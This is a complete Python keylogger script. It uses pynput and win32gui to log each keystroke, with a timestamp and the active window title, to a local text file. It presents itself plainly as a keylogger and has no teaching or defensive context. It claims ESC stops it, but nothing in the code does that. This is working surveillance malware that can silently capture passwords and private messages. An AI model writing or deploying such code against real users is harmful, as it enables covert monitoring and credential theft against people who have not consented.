import os
import time
from pynput import keyboard
import win32gui
from datetime import datetime

LOG_FILE = "key_log.txt"

def get_active_window():
    try:
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        return window
    except:
        return "Unknown Window"

def on_press(key):
    current_window = get_active_window()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        key_text = key.char if hasattr(key, 'char') and key.char is not None else f"[{key.name}]"
    except AttributeError:
        key_text = f"[{key}]"

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} | {current_window} | {key_text}\n")

def main():
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
